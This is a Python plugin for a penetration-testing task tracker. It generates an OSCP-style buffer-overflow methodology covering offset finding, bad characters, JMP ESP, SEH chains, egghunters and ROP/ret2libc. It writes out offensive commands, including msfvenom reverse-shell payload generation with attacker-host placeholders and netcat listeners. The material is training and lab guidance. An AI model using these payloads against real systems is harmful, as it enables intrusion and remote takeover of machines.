"""
Binary Exploitation service plugin

Generates methodology tasks for Windows/Linux buffer overflow exploitation including:
- Stack overflow analysis (offset finding, bad char detection)
- EIP/RIP control verification
- Protection analysis (ASLR, DEP, Stack Canary, SafeSEH)
- ret2win exploitation
- Stack shellcode injection
- SEH-based exploitation (Windows)
- Stack pivoting techniques
- ROP chain construction
- Shellcode generation and testing

Extracted from HackTricks: binary-exploitation/stack-overflow/* and windows-exploiting-basic-guide-oscp-lvl.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class BinaryExploitationPlugin(ServicePlugin):
    """Buffer overflow exploitation methodology plugin for OSCP"""

    @property
    def name(self) -> str:
        return "binary-exploitation"

    @property
    def default_ports(self) -> List[int]:
        # Binary exploitation is file-based, not port-based
        # But we return common vulnerable service ports for detection
        return []

    @property
    def service_names(self) -> List[str]:
        # Will detect based on custom conditions, not service names
        return ['binary', 'executable', 'bof', 'buffer-overflow']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Binary exploitation is manually triggered, not auto-detected from port scans.
        Users will manually create tasks for binary analysis.

        Return False by default - this plugin is invoked manually.
        """
        # Check if explicitly marked for binary exploitation
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()

        # Detect if marked as vulnerable service or binary analysis
        return (
            'binary' in service or
            'executable' in service or
            'bof' in service or
            'buffer' in product or
            port_info.get('binary_analysis', False)
        )

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate buffer overflow exploitation methodology task tree"""
        version = service_info.get('version', '')
        binary_path = service_info.get('binary_path', '/path/to/binary')
        platform = service_info.get('platform', 'linux').lower()

        tasks = {
            'id': f'binary-exploit-methodology',
            'name': f'Buffer Overflow Exploitation Methodology',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: Initial Analysis & Crash Discovery
        tasks['children'].append({
            'id': 'phase-1-discovery',
            'name': 'Phase 1: Crash Discovery & Initial Analysis',
            'type': 'parent',
            'children': [
                {
                    'id': 'file-analysis',
                    'name': 'Binary File Analysis',
                    'type': 'command',
                    'metadata': {
                        'command': f'file {binary_path}',
                        'description': 'Identify binary type, architecture, and basic properties',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'file': 'Determine file type and architecture (32/64-bit)'
                        },
                        'success_indicators': [
                            'ELF 32-bit or 64-bit identified',
                            'PE32 or PE32+ for Windows',
                            'LSB/MSB endianness noted',
                            'Dynamically linked or statically linked'
                        ],
                        'failure_indicators': [
                            'Not an executable',
                            'Corrupted file',
                            'Unsupported format'
                        ],
                        'next_steps': [
                            'Note architecture (x86/x64) for exploit development',
                            'Identify if stripped (affects debugging)',
                            'Check if statically linked (libc functions embedded)'
                        ],
                        'alternatives': [
                            f'readelf -h {binary_path} (Linux ELF)',
                            f'objdump -f {binary_path}',
                            'Manual: Check first bytes (ELF = 7f 45 4c 46, PE = 4d 5a)'
                        ],
                        'notes': '32-bit vs 64-bit changes register names (EIP/RIP, ESP/RSP) and calling conventions. Note platform for shellcode generation.'
                    }
                },
                {
                    'id': 'protection-analysis',
                    'name': 'Check Security Protections',
                    'type': 'command',
                    'metadata': {
                        'command': f'checksec --file={binary_path}',
                        'description': 'Identify enabled binary protections (NX, PIE, Canary, RELRO)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '--file': 'Analyze specific binary file for protections'
                        },
                        'success_indicators': [
                            'NX status (stack executable or not)',
                            'PIE status (ASLR for binary)',
                            'Stack Canary presence',
                            'RELRO status (GOT protection)',
                            'FORTIFY status'
                        ],
                        'failure_indicators': [
                            'checksec not installed',
                            'Binary format not recognized'
                        ],
                        'next_steps': [
                            'NX enabled: Cannot execute stack shellcode directly (need ROP)',
                            'PIE enabled: Addresses randomized (need leak)',
                            'Canary enabled: Must leak or bypass canary',
                            'No protections: Direct shellcode execution possible'
                        ],
                        'alternatives': [
                            f'readelf -l {binary_path} | grep GNU_STACK (NX check)',
                            f'readelf -h {binary_path} | grep Type (PIE check)',
                            'gdb: "info proc mappings" (runtime protection check)',
                            'Manual: strings binary | grep stack_chk (canary detection)'
                        ],
                        'notes': 'Windows: Check SafeSEH, ASLR, DEP via mona.py or PESecurity. No protections = ideal OSCP scenario.'
                    }
                },
                {
                    'id': 'fuzzing-crash',
                    'name': 'Fuzz for Crash',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 -c "print(\'A\'*1000)" | {binary_path}',
                        'description': 'Send large input to trigger buffer overflow crash',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'flag_explanations': {
                            'print("A"*1000)': 'Generate 1000-byte pattern of As',
                            '|': 'Pipe output as stdin to binary'
                        },
                        'success_indicators': [
                            'Segmentation fault (SIGSEGV)',
                            'Access violation 0x41414141',
                            'Process crash with controlled EIP/RIP'
                        ],
                        'failure_indicators': [
                            'No crash (buffer too small or no vulnerability)',
                            'Program exits normally',
                            'Crash without 0x41... in EIP/RIP'
                        ],
                        'next_steps': [
                            'Verify crash is repeatable',
                            'Check if EIP/RIP contains 0x41414141',
                            'If crash but wrong address: adjust buffer size',
                            'Move to offset finding phase'
                        ],
                        'alternatives': [
                            f'(python3 -c "print(\'A\'*1000)"; cat) | nc {target} {port} (network service)',
                            'Manually send large input via application interface',
                            'Metasploit pattern_create.rb for unique pattern'
                        ],
                        'notes': 'Start with 1000 bytes. Increase if no crash (2000, 3000). Decrease if crash too early. Network services: send via socket.'
                    }
                }
            ]
        })

        # PHASE 2: Offset Discovery & EIP/RIP Control
        tasks['children'].append({
            'id': 'phase-2-control',
            'name': 'Phase 2: Find Offset & Control EIP/RIP',
            'type': 'parent',
            'children': [
                {
                    'id': 'generate-pattern',
                    'name': 'Generate Cyclic Pattern',
                    'type': 'command',
                    'metadata': {
                        'command': '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000',
                        'description': 'Create unique De Bruijn sequence to identify exact offset',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-l': 'Length of pattern to generate (match crash buffer size)',
                            'pattern_create.rb': 'Metasploit tool for cyclic patterns'
                        },
                        'success_indicators': [
                            'Unique pattern generated',
                            'Pattern length matches crash buffer'
                        ],
                        'failure_indicators': [
                            'Tool not found (install metasploit-framework)'
                        ],
                        'next_steps': [
                            'Send pattern instead of As',
                            'Crash binary with pattern',
                            'Note EIP/RIP value from crash',
                            'Use pattern_offset to find offset'
                        ],
                        'alternatives': [
                            'pwntools: from pwn import *; cyclic(1000)',
                            'gdb-peda: pattern create 1000',
                            'gdb-gef: pattern create 1000',
                            'radare2: ragg2 -P 1000 -r'
                        ],
                        'notes': 'De Bruijn sequence ensures every 4-byte substring is unique. Critical for precise offset calculation.'
                    }
                },
                {
                    'id': 'find-offset',
                    'name': 'Calculate EIP/RIP Offset',
                    'type': 'command',
                    'metadata': {
                        'command': '/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x41414141',
                        'description': 'Find exact byte offset that overwrites EIP/RIP',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-l': 'Pattern length used (must match pattern_create)',
                            '-q': 'Query value (EIP/RIP value from crash, little-endian)',
                            'pattern_offset.rb': 'Finds offset of substring in De Bruijn sequence'
                        },
                        'success_indicators': [
                            'Exact offset found (e.g., "Offset: 524")',
                            'Offset + 4 = buffer size to reach EIP'
                        ],
                        'failure_indicators': [
                            'Pattern not found (wrong length or wrong value)',
                            'Multiple matches (pattern too short)'
                        ],
                        'next_steps': [
                            'Test offset: "A"*offset + "BBBB" + "CCCC"',
                            'Verify EIP = 0x42424242 (BBBB)',
                            'Confirm control of 4 bytes after overflow',
                            'Move to bad character testing'
                        ],
                        'alternatives': [
                            'pwntools: cyclic_find(0x41414141)',
                            'gdb-peda: pattern search or pattern offset <addr>',
                            'gdb-gef: pattern search $eip',
                            'Manual: Calculate position in pattern string'
                        ],
                        'notes': 'Little-endian: If EIP shows "6c616162", query with 0x6261616c (reversed). 64-bit: Use 8-byte offsets (RIP).'
                    }
                },
                {
                    'id': 'verify-control',
                    'name': 'Verify EIP/RIP Control',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test precise control of instruction pointer with known values',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'next_steps': [
                            'Create exploit: "A"*offset + p32(0x42424242) + "C"*100',
                            'Send exploit and crash binary',
                            'Verify EIP = 0x42424242 in debugger',
                            'Check ESP/RSP points to Cs (shellcode space)',
                            'Note shellcode space size (how many Cs survive)',
                            'If ESP/RSP points to controllable data: good for shellcode',
                            'Document offset value for final exploit'
                        ],
                        'alternatives': [
                            'Test with different markers: "BBBB", "\\x42\\x42\\x42\\x42"',
                            'Verify ESP points to controlled buffer',
                            'Check stack layout in debugger'
                        ],
                        'notes': 'p32() = pack 32-bit little-endian. Use p64() for 64-bit. ESP/RSP should point near or into buffer for shellcode placement.'
                    }
                }
            ]
        })

        # PHASE 3: Bad Character Discovery
        tasks['children'].append({
            'id': 'phase-3-badchars',
            'name': 'Phase 3: Identify Bad Characters',
            'type': 'parent',
            'children': [
                {
                    'id': 'generate-badchars',
                    'name': 'Generate Bad Character Test String',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create byte array (0x01-0xFF) to test which characters break exploit',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'next_steps': [
                            'Python: badchars = bytes(range(1, 256))',
                            'Exclude 0x00 by default (NULL terminates strings)',
                            'Send: "A"*offset + "BBBB" + badchars',
                            'Crash binary and inspect memory at ESP/RSP',
                            'Compare sent bytes vs received bytes in memory',
                            'Note any missing, truncated, or mangled bytes',
                            'Iteratively remove bad chars and retest'
                        ],
                        'alternatives': [
                            'mona.py: !mona bytearray -cpb "\\x00"',
                            'Manual hex string: \\x01\\x02\\x03...\\xff',
                            'Copy from HackTricks badchars template'
                        ],
                        'notes': 'Common bad chars: 0x00 (NULL), 0x0a (LF), 0x0d (CR), 0x20 (space). Services parsing strings often mangle these.'
                    }
                },
                {
                    'id': 'test-badchars',
                    'name': 'Test and Document Bad Characters',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Iteratively identify all characters that corrupt the exploit',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'next_steps': [
                            'Debugger: Follow ESP/RSP in memory dump',
                            'Compare badchar string with actual memory',
                            'If byte missing/changed: mark as bad character',
                            'Remove bad char from test string',
                            'Repeat until all bytes 01-FF present in memory',
                            'Document final bad char list: -b "\\x00\\x0a\\x0d"',
                            'Use bad char list for msfvenom shellcode generation'
                        ],
                        'alternatives': [
                            'mona.py: !mona compare -f bytearray.bin -a <ESP_address>',
                            'Manual: Hex compare tool (HxD, hexdump)',
                            'Python script to compare sent vs received bytes'
                        ],
                        'notes': 'Critical step! Bad chars in shellcode will break exploit. Common: 0x00 0x0a 0x0d 0x20. Network protocols add more.'
                    }
                }
            ]
        })

        # PHASE 4: Exploitation Strategy (Linux)
        if platform == 'linux':
            tasks['children'].append(self._generate_linux_exploitation_tasks(binary_path, version, service_info))
        # PHASE 4: Exploitation Strategy (Windows)
        elif platform == 'windows':
            tasks['children'].append(self._generate_windows_exploitation_tasks(binary_path, version, service_info))
        else:
            # Generic exploitation
            tasks['children'].append(self._generate_generic_exploitation_tasks(binary_path, version, service_info))

        return tasks

    def _generate_linux_exploitation_tasks(self, binary_path: str, version: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Linux-specific exploitation tasks"""
        return {
            'id': 'phase-4-linux-exploit',
            'name': 'Phase 4: Linux Exploitation Strategy',
            'type': 'parent',
            'children': [
                {
                    'id': 'ret2win-linux',
                    'name': 'Ret2Win (Call Hidden Function)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Redirect execution to existing win/flag function in binary',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'next_steps': [
                            'Find win function: objdump -d binary | grep win',
                            'Or: readelf -s binary | grep win',
                            'Or: gdb: info functions | grep win',
                            'Note win function address (e.g., 0x08048486)',
                            'Build exploit: "A"*offset + p32(win_addr)',
                            'If 64-bit and function needs params: add ROP gadgets',
                            'Send exploit and verify win function executes',
                            'Capture flag from output'
                        ],
                        'alternatives': [
                            'pwntools: elf = ELF("binary"); win = elf.symbols["win"]',
                            'radare2: afl | grep win (list functions)',
                            'ghidra/IDA: Search function names',
                            'Manual disassembly for function address'
                        ],
                        'notes': 'Requires: No PIE (or leak), No Stack Canary (or leak). 64-bit: may need params in RDI/RSI via ROP.'
                    }
                },
                {
                    'id': 'stack-shellcode-linux',
                    'name': 'Stack Shellcode Injection',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'check-nx',
                            'name': 'Verify Stack is Executable (NX disabled)',
                            'type': 'command',
                            'metadata': {
                                'command': f'readelf -l {binary_path} | grep GNU_STACK',
                                'description': 'Check if stack has execute permissions',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'success_indicators': [
                                    'RWE (Read Write Execute) permissions',
                                    'No NX enabled'
                                ],
                                'failure_indicators': [
                                    'RW- (no execute, NX enabled)',
                                    'Must use ROP/ret2libc instead'
                                ],
                                'next_steps': [
                                    'If NX disabled: Direct shellcode on stack viable',
                                    'If NX enabled: Skip to ROP/ret2libc methods',
                                    'Generate shellcode with msfvenom',
                                    'Find jump to ESP/RSP or use leaked stack address'
                                ],
                                'alternatives': [
                                    'checksec output (NX enabled/disabled)',
                                    'gdb: info proc mappings (check [stack] perms)',
                                    'At runtime: cat /proc/<PID>/maps | grep stack'
                                ],
                                'notes': 'Modern Linux: NX enabled by default. OSCP labs may have older binaries without NX.'
                            }
                        },
                        {
                            'id': 'generate-shellcode-linux',
                            'name': 'Generate Linux Shellcode',
                            'type': 'command',
                            'metadata': {
                                'command': 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f python -b "\\x00\\x0a\\x0d"',
                                'description': 'Create reverse shell shellcode avoiding bad characters',
                                'tags': ['OSCP:HIGH'],
                                'flag_explanations': {
                                    '-p': 'Payload selection',
                                    'linux/x86/shell_reverse_tcp': 'Linux 32-bit reverse shell',
                                    'LHOST': 'Attacker IP for callback',
                                    'LPORT': 'Attacker listening port',
                                    '-f python': 'Output format as Python bytes',
                                    '-b': 'Bad characters to avoid (hex format)'
                                },
                                'success_indicators': [
                                    'Shellcode generated without errors',
                                    'Size <= available stack space',
                                    'No bad characters in output'
                                ],
                                'failure_indicators': [
                                    'Shellcode too large',
                                    'Cannot avoid bad characters (try different encoder)',
                                    'Payload not found'
                                ],
                                'next_steps': [
                                    '64-bit: Change to linux/x64/shell_reverse_tcp',
                                    'Note shellcode size (must fit in buffer)',
                                    'Add NOP sled before shellcode: "\\x90"*16 + shellcode',
                                    'Start listener: nc -nlvp <LPORT>',
                                    'Build exploit: "\\x90"*16 + shellcode + "A"*(offset-len(nop+sc)) + jmp_esp',
                                    'Send exploit'
                                ],
                                'alternatives': [
                                    'pwntools: shellcraft.sh() or shellcraft.linux.sh()',
                                    'Manual shellcode from shell-storm.org',
                                    'Custom assembly with nasm + objdump',
                                    'Try different encoder: -e x86/shikata_ga_nai'
                                ],
                                'notes': 'Shellcode size matters! Typical: 100-350 bytes. NOP sled increases reliability when jumping into shellcode area.'
                            }
                        },
                        {
                            'id': 'find-jmp-esp',
                            'name': 'Find JMP ESP Gadget',
                            'type': 'command',
                            'metadata': {
                                'command': 'ropper --file binary --search "jmp esp"',
                                'description': 'Locate gadget to jump to stack pointer (where shellcode resides)',
                                'tags': ['OSCP:HIGH'],
                                'flag_explanations': {
                                    '--file': 'Binary to search',
                                    '--search': 'Search for specific instruction',
                                    'jmp esp': 'Jump to stack pointer (x86), use "jmp rsp" for x64'
                                },
                                'success_indicators': [
                                    'JMP ESP address found (e.g., 0x08048abc)',
                                    'Address contains no bad characters',
                                    'Gadget in non-ASLR module'
                                ],
                                'failure_indicators': [
                                    'No JMP ESP found',
                                    'Address has bad characters',
                                    'PIE/ASLR makes address unreliable'
                                ],
                                'next_steps': [
                                    'Verify address has no bad chars',
                                    'Alternative: Find call esp, push esp; ret',
                                    'Build exploit: shellcode + padding + p32(jmp_esp_addr)',
                                    'When EIP hits JMP ESP: execution jumps to shellcode at ESP'
                                ],
                                'alternatives': [
                                    'ROPgadget: ROPgadget --binary binary --only "jmp"',
                                    'msf-nasm_shell: jmp esp → \\xff\\xe4',
                                    'objdump -d binary | grep "ff e4"',
                                    'Manual: Search for opcodes \\xff\\xe4 in binary'
                                ],
                                'notes': 'JMP ESP opcode: \\xff\\xe4 (x86). If ASLR: need leak. If no JMP ESP: try "call esp" or "push esp; ret".'
                            }
                        }
                    ]
                },
                {
                    'id': 'rop-linux',
                    'name': 'ROP Chain Construction (NX Bypass)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Build Return-Oriented Programming chain for ret2libc or ret2syscall',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED'],
                        'next_steps': [
                            'Find ROP gadgets: ropper --file binary --chain',
                            'Strategy 1 - ret2libc: Call system("/bin/sh")',
                            '  - Find system() in PLT: objdump -d binary | grep system',
                            '  - Find "/bin/sh" string: strings -a -t x binary | grep /bin/sh',
                            '  - Build: padding + p32(system_plt) + p32(0xdeadbeef) + p32(binsh_addr)',
                            'Strategy 2 - ret2syscall: Direct execve syscall',
                            '  - Find gadgets: pop eax; ret, pop ebx; ret, int 0x80',
                            '  - Set EAX=11 (execve), EBX="/bin/sh", ECX=0, EDX=0',
                            '  - Chain gadgets to prepare registers',
                            'Strategy 3 - ASLR bypass: Leak libc address first',
                            '  - Call puts(got_entry) to leak libc function address',
                            '  - Calculate libc base, find system/binsh offsets',
                            '  - Return to vuln function, exploit again with real addresses'
                        ],
                        'alternatives': [
                            'pwntools: ROP(elf) automation',
                            'ROPgadget --binary binary --ropchain',
                            'Metasploit pattern for gadget hunting',
                            'Manual gadget search with objdump'
                        ],
                        'notes': 'ROP bypasses NX. Complex but critical for modern exploits. 64-bit calling convention: RDI, RSI, RDX for params.'
                    }
                }
            ]
        }

    def _generate_windows_exploitation_tasks(self, binary_path: str, version: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Windows-specific exploitation tasks"""
        return {
            'id': 'phase-4-windows-exploit',
            'name': 'Phase 4: Windows Exploitation Strategy',
            'type': 'parent',
            'children': [
                {
                    'id': 'seh-overflow',
                    'name': 'SEH-based Exploitation (x86 Windows)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'verify-seh-overwrite',
                            'name': 'Verify SEH Overwrite',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Confirm buffer overflow overwrites SEH chain on stack',
                                'tags': ['OSCP:HIGH', 'WINDOWS'],
                                'next_steps': [
                                    'Crash application with large buffer',
                                    'x32dbg: Check "SEH chain" view',
                                    'Verify nSEH/SEH fields overwritten with As',
                                    'Send cyclic pattern to find nSEH/SEH offsets',
                                    'Calculate: offset_nSEH and offset_SEH (4 bytes apart)',
                                    'Test: "A"*offset_nSEH + "BBBB" + "CCCC" + padding',
                                    'Confirm nSEH=0x42424242, SEH=0x43434343'
                                ],
                                'alternatives': [
                                    'Immunity Debugger + mona.py: !mona seh',
                                    'WinDbg: !exchain (view SEH chain)',
                                    'Manual: Check stack for exception handler pointers'
                                ],
                                'notes': 'SEH = Structured Exception Handler. x86 only. nSEH = next SEH record (4 bytes), SEH = handler address (4 bytes).'
                            }
                        },
                        {
                            'id': 'find-pop-pop-ret',
                            'name': 'Find POP POP RET Gadget',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Locate SEH gadget in non-SafeSEH module',
                                'tags': ['OSCP:HIGH', 'WINDOWS'],
                                'next_steps': [
                                    'mona.py: !mona modules (list loaded modules)',
                                    'Find module with: SafeSEH=False, ASLR=False, Rebase=False',
                                    'mona.py: !mona seh -m module.dll',
                                    'Get POP POP RET address (e.g., 0x5f4a358f)',
                                    'Verify address has no bad characters',
                                    'Alternative: Use binary itself if unprotected'
                                ],
                                'alternatives': [
                                    'ERC.Xdbg (x64dbg): ERC --SEH',
                                    'rp++: rp-win.exe -f module.dll -r 3 --unique | grep "pop.*pop.*ret"',
                                    'Manual search: opcodes for POP POP RET'
                                ],
                                'notes': 'POP POP RET unwinds SEH frame. Must be in non-SafeSEH module. Windows system DLLs often suitable.'
                            }
                        },
                        {
                            'id': 'seh-jump-back',
                            'name': 'Construct Short Jump to Near Jump',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Chain jumps to reach shellcode before nSEH',
                                'tags': ['OSCP:HIGH', 'WINDOWS', 'MANUAL'],
                                'next_steps': [
                                    'nSEH space: Only 4 bytes available',
                                    'Strategy: short jump (2 bytes) + 2 byte padding',
                                    'Place 5-byte near jump just before nSEH',
                                    'nasmshell.com: "jmp short -8" → \\xeb\\xf6',
                                    'nasmshell.com: "jmp -660" → \\xe9\\x67\\xfd\\xff\\xff',
                                    'Layout: [NOP+shellcode][padding][near_jmp -X][nSEH: short_jmp -8][SEH: pop_pop_ret]',
                                    'When exception triggered: SEH→POP POP RET→nSEH→short jmp→near jmp→shellcode'
                                ],
                                'alternatives': [
                                    'Use longer nSEH space if available',
                                    'Alternative: Jump forward to shellcode after SEH'
                                ],
                                'notes': 'Short jmp: 2 bytes, range ±128. Near jmp: 5 bytes, range ±2GB. Account for jump distance calculation.'
                            }
                        },
                        {
                            'id': 'windows-shellcode',
                            'name': 'Generate Windows Shellcode',
                            'type': 'command',
                            'metadata': {
                                'command': 'msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f python -b "\\x00\\x0a\\x0d" -a x86 --platform windows',
                                'description': 'Create Windows reverse shell avoiding bad characters',
                                'tags': ['OSCP:HIGH', 'WINDOWS'],
                                'flag_explanations': {
                                    '-p': 'Payload type',
                                    'windows/shell_reverse_tcp': 'Windows reverse shell',
                                    '-a x86': 'Architecture (32-bit)',
                                    '--platform windows': 'Target platform',
                                    '-f python': 'Python format output',
                                    '-b': 'Bad characters to avoid'
                                },
                                'success_indicators': [
                                    'Shellcode generated',
                                    'No bad characters present',
                                    'Payload size acceptable (300-500 bytes typical)'
                                ],
                                'next_steps': [
                                    'Add NOPs before shellcode: "\\x90"*16',
                                    'Start listener: rlwrap nc -nlvp <LPORT>',
                                    'Assemble full exploit buffer',
                                    'Send and trigger exception',
                                    'Get reverse shell when exploitation succeeds'
                                ],
                                'alternatives': [
                                    'windows/meterpreter/reverse_tcp for Metasploit',
                                    'windows/exec CMD="calc.exe" for PoC',
                                    'Custom shellcode from shell-storm'
                                ],
                                'notes': 'EXITFUNC=thread recommended for stability. Test with calc.exe before reverse shell.'
                            }
                        }
                    ]
                },
                {
                    'id': 'standard-eip-windows',
                    'name': 'Standard EIP Overwrite (No SEH)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'find-jmp-esp-windows',
                            'name': 'Find JMP ESP in Windows DLL',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Locate JMP ESP in non-ASLR module for shellcode execution',
                                'tags': ['OSCP:HIGH', 'WINDOWS'],
                                'next_steps': [
                                    'mona.py: !mona modules',
                                    'Find module: ASLR=False, Rebase=False',
                                    'mona.py: !mona find -s "\\xff\\xe4" -m module.dll',
                                    'JMP ESP opcode: \\xff\\xe4',
                                    'Note address without bad characters',
                                    'Build: padding + p32(jmp_esp_addr) + NOP_sled + shellcode'
                                ],
                                'alternatives': [
                                    'ERC.Xdbg: ERC --ModuleInfo, ERC --FindNRP JMP ESP',
                                    'Manual: Search for \\xff\\xe4 in module memory',
                                    'Try CALL ESP (\\xff\\xd4) or PUSH ESP; RET'
                                ],
                                'notes': 'Windows 7/older: Many non-ASLR DLLs. Windows 10+: Harder, may need leak. OSCP labs often have unprotected modules.'
                            }
                        }
                    ]
                },
                {
                    'id': 'egghunter-windows',
                    'name': 'Egghunter (Limited Space)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use egghunter when shellcode space is limited (<100 bytes)',
                        'tags': ['OSCP:MEDIUM', 'WINDOWS', 'ADVANCED'],
                        'next_steps': [
                            'mona.py: !mona egg -t W00T',
                            'Generates 32-byte egghunter shellcode',
                            'Place egghunter at EIP jump point',
                            'Place "W00TW00T" + shellcode elsewhere (stack, heap)',
                            'Egghunter searches memory for egg tag',
                            'Executes shellcode after egg tag'
                        ],
                        'alternatives': [
                            'Manual egghunter assembly',
                            'SEH-based egghunter for smaller size',
                            'Two-stage exploit with socket reuse'
                        ],
                        'notes': 'Useful for small buffer overflows. Egghunter ~32 bytes vs shellcode ~300+ bytes. Use unique egg tag.'
                    }
                }
            ]
        }

    def _generate_generic_exploitation_tasks(self, binary_path: str, version: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate platform-agnostic exploitation tasks"""
        return {
            'id': 'phase-4-generic-exploit',
            'name': 'Phase 4: Platform Detection & Strategy',
            'type': 'manual',
            'metadata': {
                'description': 'Determine target platform and select appropriate exploitation method',
                'tags': ['OSCP:HIGH', 'MANUAL'],
                'next_steps': [
                    'Identify platform: file command, service behavior, error messages',
                    'Linux: Check for ELF header, POSIX syscalls, /proc/self/maps',
                    'Windows: Check for PE header, Win32 API calls, SEH structures',
                    'Select exploitation path:',
                    '  - Linux: ret2win → stack shellcode → ROP → ret2libc',
                    '  - Windows: SEH overflow → EIP+JMP ESP → Egghunter',
                    'Review binary protections (checksec)',
                    'Adjust strategy based on NX, PIE, ASLR, Canary, SafeSEH',
                    'Generate platform-specific shellcode',
                    'Build and test exploit iteratively'
                ],
                'alternatives': [
                    'Manually inspect binary headers',
                    'Run binary and observe behavior',
                    'Check for platform-specific libraries (libc.so vs kernel32.dll)'
                ],
                'notes': 'Platform detection critical for shellcode and ROP gadgets. Cross-platform exploits rare.'
            }
        }
